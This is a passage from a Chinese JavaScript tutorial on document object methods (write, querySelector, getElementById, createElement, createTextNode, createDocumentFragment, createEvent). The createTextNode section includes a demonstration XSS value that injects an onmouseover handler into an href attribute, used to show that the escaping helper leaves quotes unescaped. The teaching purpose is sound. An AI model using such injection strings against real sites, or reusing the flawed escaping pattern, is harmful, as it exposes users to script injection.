language_">document</span>.<span class="title function_">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>如果在页面渲染过程中调用<code>write</code>方法，并不会自动调用<code>open</code>方法。（可以理解成，<code>open</code>方法已调用，但<code>close</code>方法还未调用。）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">hello</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;world&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在浏览器打开上面网页，将会显示<code>hello world</code>。</p>
<p><code>document.write</code>是 JavaScript 语言标准化之前就存在的方法，现在完全有更符合标准的方法向文档写入内容（比如对<code>innerHTML</code>属性赋值）。所以，<strong>除了某些特殊情况，应该尽量避免使用<code>document.write</code>这个方法。</strong></p>
<p><code>document.writeln</code>方法与<code>write</code>方法完全一致，除了会在输出内容的尾部添加换行符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>注意，<code>writeln</code>方法添加的是 ASCII 码的换行符，渲染成 HTML 网页时不起作用，即在网页上显示不出换行。网页上的换行，必须显式写入<code> </code>。</p>
<h4 id="3-3-document-querySelector-返回匹配该选择器的元素节点，document-querySelectorAll-返回一个NodeList对象，包含所有匹配给定选择器的节点"><a href="#3-3-document-querySelector-返回匹配该选择器的元素节点，document-querySelectorAll-返回一个NodeList对象，包含所有匹配给定选择器的节点" class="headerlink" title="3.3 document.querySelector() 返回匹配该选择器的元素节点，document.querySelectorAll() 返回一个NodeList对象，包含所有匹配给定选择器的节点"></a>3.3 document.querySelector() 返回匹配该选择器的元素节点，document.querySelectorAll() 返回一个<code>NodeList</code>对象，包含所有匹配给定选择器的节点</h4><p><code>document.querySelector</code>方法接受一个 CSS 选择器作为参数，<strong>返回匹配该选择器的元素节点</strong>。如果有多个节点满足匹配条件，则返回第一个匹配的节点。如果没有发现匹配的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.myclass&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> el2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#myParent &gt; [ng-click]&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>document.querySelectorAll</code>方法与<code>querySelector</code>用法类似，区别是<strong>返回一个<code>NodeList</code>对象，包含所有匹配给定选择器的节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elementList = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.myclass&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这两个方法的参数，可以是逗号分隔的多个 CSS 选择器，返回匹配其中一个选择器的元素节点，这与 CSS 选择器的规则是一致的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> matches = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div.note, div.alert&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码返回<code>class</code>属性是<code>note</code>或<code>alert</code>的<code>div</code>元素。</p>
<p>这两个方法都<strong>支持复杂的 CSS 选择器</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选中 data-foo-bar 属性等于 someval 的元素</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;[data-foo-bar=&quot;someval&quot;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中 myForm 表单中所有不通过验证的元素</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#myForm :invalid&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中div元素，那些 class 含 ignore 的除外</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;DIV:not(.ignore)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时选中 div，a，script 三类元素</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;DIV, A, SCRIPT&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>但是，它们<strong>不支持 CSS 伪元素的选择器</strong>（比如<code>:first-line</code>和<code>:first-letter</code>）和<strong>伪类的选择器</strong>（比如<code>:link</code>和<code>:visited</code>），即无法选中伪元素和伪类。</p>
<p>如果<code>querySelectorAll</code>方法的参数是字符串<code>*</code>，则会返回文档中的所有元素节点。另外，<code>querySelectorAll</code>的返回结果不是动态集合，不会实时反映元素节点的变化。</p>
<p>最后，这两个方法除了定义在<code>document</code>对象上，还定义在元素节点上，即<strong>在元素节点上也可以调用</strong>。</p>
<h4 id="3-4-document-getElementsByTagName-搜索-HTML-标签名，返回符合条件的元素"><a href="#3-4-document-getElementsByTagName-搜索-HTML-标签名，返回符合条件的元素" class="headerlink" title="3.4 document.getElementsByTagName() 搜索 HTML 标签名，返回符合条件的元素"></a>3.4 document.getElementsByTagName() 搜索 HTML 标签名，返回符合条件的元素</h4><p><code>document.getElementsByTagName</code>方法<strong>搜索 HTML 标签名，返回符合条件的元素</strong>。它的返回值是一个类似数组对象（**<code>HTMLCollection</code>实例**），可以实时反映 HTML 文档的变化。如果没有任何匹配的元素，就返回一个空集。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> paras = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">paras <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码返回当前文档的所有<code>p</code>元素节点。</p>
<p>HTML 标签名是大小写不敏感的，因此<code>getElementsByTagName</code>方法也是大小写不敏感的。另外，返回结果中，各个成员的顺序就是它们在文档中出现的顺序。</p>
<p>如果传入<code>*</code>，就可以返回文档中所有 HTML 元素。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>，元素节点本身也定义了<code>getElementsByTagName</code>方法，返回该元素的后代元素中符合条件的元素。也就是说，这个方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> firstPara = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;p&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> spans = firstPara.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;span&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码选中第一个<code>p</code>元素内部的所有<code>span</code>元素。</p>
<h4 id="3-5-document-getElementsByClassName-返回class符合条件的元素"><a href="#3-5-document-getElementsByClassName-返回class符合条件的元素" class="headerlink" title="3.5 document.getElementsByClassName() 返回class符合条件的元素"></a>3.5 document.getElementsByClassName() 返回class符合条件的元素</h4><p><code>document.getElementsByClassName</code>方法返回一个类似数组的对象（**<code>HTMLCollection</code>实例<strong>），</strong>包括了所有<code>class</code>名字符合指定条件的元素，元素的变化实时反映在返回结果中**。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(names);</span><br></pre></td></tr></table></figure>

<p><strong>由于<code>class</code>是保留字，所以 JavaScript 一律使用<code>className</code>表示 CSS 的<code>class</code>。</strong></p>
<p>参数可以是多个<code>class</code>，它们之间使用空格分隔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;foo bar&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码返回<strong>同时具有<code>foo</code>和<code>bar</code>两个<code>class</code>的元素</strong>，<code>foo</code>和<code>bar</code>的顺序不重要。</p>
<p>注意，正常模式下，CSS 的<code>class</code>是大小写敏感的。（<code>quirks mode</code>下，大小写不敏感。）</p>
<p>与<code>getElementsByTagName</code>方法一样，<code>getElementsByClassName</code>方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 非document对象上调用</span></span><br><span class="line"><span class="keyword">var</span> elements = rootElement.<span class="title function_">getElementsByClassName</span>(names);</span><br></pre></td></tr></table></figure>



<h4 id="3-6-document-getElementsByName-返回拥有相应name值的元素"><a href="#3-6-document-getElementsByName-返回拥有相应name值的元素" class="headerlink" title="3.6 document.getElementsByName() 返回拥有相应name值的元素"></a>3.6 document.getElementsByName() 返回拥有相应name值的元素</h4><p><code>document.getElementsByName</code>方法用于选择拥有<code>name</code>属性的 HTML 元素（比如<code>&lt;form&gt;</code>、<code>&lt;radio&gt;</code>、<code> &lt;img&gt; </code>、<code>&lt;frame&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;object&gt;</code>等），返回一个类似数组的的对象（**<code>NodeList</code>实例**），因为<code>name</code>属性相同的元素可能不止一个。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表单为 &lt;form name=&quot;x&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="keyword">var</span> forms = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">forms[<span class="number">0</span>].<span class="property">tagName</span> <span class="comment">// &quot;FORM&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-7-document-getElementById-返回匹配指定id属性的元素节点"><a href="#3-7-document-getElementById-返回匹配指定id属性的元素节点" class="headerlink" title="3.7 document.getElementById() 返回匹配指定id属性的元素节点"></a>3.7 document.getElementById() 返回匹配指定<code>id</code>属性的元素节点</h4><p><code>document.getElementById</code>方法<strong>返回匹配指定<code>id</code>属性的元素节点</strong>。如果没有发现匹配的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;para1&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意，该方法的参数是大小写敏感的。比如，如果某个节点的<code>id</code>属性是<code>main</code>，那么<code>document.getElementById(&#39;Main&#39;)</code>将返回<code>null</code>。</p>
<p><strong><code>document.getElementById</code>方法与<code>document.querySelector</code>方法都能获取元素节点，</strong>不同之处是<code>document.querySelector</code>方法的参数使用 CSS 选择器语法，<code>document.getElementById</code>方法的参数是元素的<code>id</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myElement&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#myElement&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码中，两个方法都能选中<code>id</code>为<code>myElement</code>的元素，但是<code>document.getElementById()</code>比<code>document.querySelector()</code>效率高得多。</p>
<p>另外，<strong>这个方法只能在<code>document</code>对象上使用，不能在其他元素节点上使用</strong>。</p>
<h4 id="3-8-document-elementFromPoint-x-y-返回位于页面指定坐标最上层的元素节点，document-elementsFromPoint-x-y-返回一个数组，成员是位于指定坐标的所有元素"><a href="#3-8-document-elementFromPoint-x-y-返回位于页面指定坐标最上层的元素节点，document-elementsFromPoint-x-y-返回一个数组，成员是位于指定坐标的所有元素" class="headerlink" title="3.8 document.elementFromPoint(x, y) 返回位于页面指定坐标最上层的元素节点，document.elementsFromPoint(x, y) 返回一个数组，成员是位于指定坐标的所有元素"></a>3.8 document.elementFromPoint(x, y) 返回位于页面指定坐标最上层的元素节点，document.elementsFromPoint(x, y) 返回一个数组，成员是位于指定坐标的所有元素</h4><p><code>document.elementFromPoint</code>方法<strong>返回位于页面指定位置最上层的元素节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">elementFromPoint</span>(<span class="number">50</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码选中在<code>(50, 50)</code>这个坐标位置的最上层的那个 HTML 元素。</p>
<p><code>elementFromPoint</code>方法的<strong>两个参数</strong>，依次<strong>是相对于当前视口左上角的横坐标和纵坐标</strong>，单位是像素。如果位于该位置的 HTML 元素不可返回（比如文本框的滚动条），则返回它的父元素（比如文本框）。如果坐标值无意义（比如负值或超过视口大小），则返回<code>null</code>。</p>
<p><code>document.elementsFromPoint()</code><strong>返回一个数组，成员是位于指定坐标（相对于视口）的所有元素</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="variable language_">document</span>.<span class="title function_">elementsFromPoint</span>(x, y);</span><br></pre></td></tr></table></figure>

<p><strong>注意：这两个方法的坐标都是相对于视口，就是说当滚动条滚动时，选中的元素可能会跟着变化。</strong></p>
<h4 id="3-9-document-createElement-创建元素节点，并返回"><a href="#3-9-document-createElement-创建元素节点，并返回" class="headerlink" title="3.9 document.createElement() 创建元素节点，并返回"></a>3.9 document.createElement() 创建元素节点，并返回</h4><p><code>document.createElement</code>方法<strong>用来生成元素节点，并返回该节点。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>createElement</code>方法的参数为元素的标签名，即元素节点的<code>tagName</code>属性，对于 HTML 网页大小写不敏感，即参数为<code>div</code>或<code>DIV</code>返回的是同一种节点。如果参数里面包含尖括号（即<code>&lt;</code>和<code>&gt;</code>）会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;&lt;div&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// DOMException: The tag name provided (&#x27;&lt;div&gt;&#x27;) is not a valid name</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>，<code>document.createElement</code>的参数可以是自定义的标签名。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="3-10-document-createTextNode-创建文本节点，并返回"><a href="#3-10-document-createTextNode-创建文本节点，并返回" class="headerlink" title="3.10 document.createTextNode() 创建文本节点，并返回"></a>3.10 document.createTextNode() 创建文本节点，并返回</h4><p><code>document.createTextNode</code>方法<strong>用来生成文本节点（<code>Text</code>实例），并返回该节点</strong>。它的<strong>参数是文本节点的内容</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line">newDiv.<span class="title function_">appendChild</span>(newContent);</span><br></pre></td></tr></table></figure>

<p>上面代码新建一个<code>div</code>节点和一个文本节点，然后将文本节点插入<code>div</code>节点。</p>
<p><strong>这个方法可以确保返回的节点，被浏览器当作文本渲染，而不是当作 HTML 代码渲染。因此，可以用来展示用户的输入，避免 XSS 攻击。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;&lt;span&gt;Foo &amp; bar&lt;/span&gt;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">innerHTML</span>)</span><br><span class="line"><span class="comment">// &amp;lt;span&amp;gt;Foo &amp;amp; bar&amp;lt;/span&amp;gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>createTextNode</code>方法对大于号和小于号进行转义，从而保证即使用户输入的内容包含恶意代码，也能正确显示。</p>
<p>需要注意的是，该方法不对单引号和双引号转义，所以不能用来对 HTML 属性赋值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">  div.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(str));</span><br><span class="line">  <span class="keyword">return</span> div.<span class="property">innerHTML</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> userWebsite = <span class="string">&#x27;&quot; onmouseover=&quot;alert(\&#x27;derp\&#x27;)&quot; &quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> profileLink = <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + <span class="title function_">escapeHtml</span>(userWebsite) + <span class="string">&#x27;&quot;&gt;Bob&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;target&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = profileLink;</span><br><span class="line"><span class="comment">// &lt;a href=&quot;&quot; onmouseover=&quot;alert(&#x27;derp&#x27;)&quot; &quot;&quot;&gt;Bob&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，由于<code>createTextNode</code>方法不转义双引号，导致<code>onmouseover</code>方法被注入了代码。</p>
<h4 id="3-11-document-createAttribute-创建属性节点，并返回"><a href="#3-11-document-createAttribute-创建属性节点，并返回" class="headerlink" title="3.11 document.createAttribute() 创建属性节点，并返回"></a>3.11 document.createAttribute() 创建属性节点，并返回</h4><p><code>document.createAttribute</code>方法<strong>生成一个新的属性节点（<code>Attr</code>实例），并返回它</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attribute = <span class="variable language_">document</span>.<span class="title function_">createAttribute</span>(name);</span><br></pre></td></tr></table></figure>

<p><code>document.createAttribute</code>方法的参数<code>name</code>，是属性的名称。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createAttribute</span>(<span class="string">&#x27;my_attrib&#x27;</span>);</span><br><span class="line">a.<span class="property">value</span> = <span class="string">&#x27;newVal&#x27;</span>;</span><br><span class="line"></span><br><span class="line">node.<span class="title function_">setAttributeNode</span>(a);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">node.<span class="title function_">setAttribute</span>(<span class="string">&#x27;my_attrib&#x27;</span>, <span class="string">&#x27;newVal&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码为<code>div1</code>节点，插入一个值为<code>newVal</code>的<code>my_attrib</code>属性。</p>
<h4 id="3-12-document-createComment-创建注释节点，并返回"><a href="#3-12-document-createComment-创建注释节点，并返回" class="headerlink" title="3.12 document.createComment() 创建注释节点，并返回"></a>3.12 document.createComment() 创建注释节点，并返回</h4><p><code>document.createComment</code>方法<strong>生成一个新的注释节点，并返回该节点。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">CommentNode</span> = <span class="variable language_">document</span>.<span class="title function_">createComment</span>(data);</span><br></pre></td></tr></table></figure>

<p><code>document.createComment</code>方法的参数是一个字符串，会成为注释节点的内容。</p>
<h4 id="3-13-document-createDocumentFragment-创建空文档片段对象"><a href="#3-13-document-createDocumentFragment-创建空文档片段对象" class="headerlink" title="3.13 document.createDocumentFragment() 创建空文档片段对象"></a>3.13 document.createDocumentFragment() 创建空文档片段对象</h4><p><code>document.createDocumentFragment</code>方法<strong>生成一个空的文档片段对象（<code>DocumentFragment</code>实例）</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docFragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br></pre></td></tr></table></figure>

<p><code>DocumentFragment</code><strong>是一个存在于内存的 DOM 片段，不属于当前文档，常常用来生成一段较复杂的 DOM 结构，然后再插入当前文档</strong>。这样做的好处在于，因为<code>DocumentFragment</code>不属于当前文档，对它的任何改动，都不会引发网页的重新渲染，<strong>比直接修改当前文档的 DOM 有更好的性能表现。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> docfrag = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>();</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">  li.<span class="property">textContent</span> = e;</span><br><span class="line">  docfrag.<span class="title function_">appendChild</span>(li);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> element  = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">element.<span class="title function_">appendChild</span>(docfrag);</span><br></pre></td></tr></table></figure>

<p>上面代码中，文档片断<code>docfrag</code>包含四个<code>&lt;li&gt;</code>节点，这些子节点被一次性插入了当前文档。</p>
<h4 id="3-14-document-createEvent-创建事件对象（Event实例）"><a href="#3-14-document-createEvent-创建事件对象（Event实例）" class="headerlink" title="3.14 document.createEvent() 创建事件对象（Event实例）"></a>3.14 document.createEvent() 创建事件对象（Event实例）</h4><p><code>document.createEvent</code>方法<strong>生成一个事件对象（<code>Event</code>实例）</strong>，该对象可以被<code>element.dispatchEvent</code>方法使用，触发指定事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="variable language_">document</span>.<span class="title function_">createEvent</span>(type);</span><br></pre></td></tr></table></figure>

<p><code>document.createEvent</code>方法的<strong>参数是事件类型，比如<code>UIEvents</code>、<code>MouseEvents</code>、<code>MutationEvents</code>、<code>HTMLEvents</code>。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="variable language_">document</span>.<span class="title function_">createEvent</span>(<span class="string">&#x27;Event&#x27;</span>);</span><br><span class="line">event.<span class="title function_">initEvent</span>(<span class="string">&#x27;build&#x27;</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;build&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">type</span>); <span class="comment">// &quot;build&quot;</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>

<p>上面代码新建了一个名为<code>build</code>的事件实例，然后触发该事件。</p>
<h4 id="3-15-document-addEventListener-添加事件监听，document-removeEventListener-移除事件监听，document-dispatchEvent-触发事件"><a href="#3-15-document-addEventListener-添加事件监听，document-removeEventListener-移除事件监听，document-dispatchEvent-触发事件" class="headerlink" title="3.15 document.addEventListener() 添加事件监听，document.removeEventListener() 移除事件监听，document.dispatchEvent() 触发事件"></a>3.15 document.addEventListener() 添加事件监听，document.removeEventListener() 移除事件监听，document.dispatchEvent() 触发事件</h4><p>这三个方法用于处理<code>document</code>节点的事件。它们都继承自<code>EventTarget</code>接口，详细介绍参见《EventTarget 接口》一章。</p>
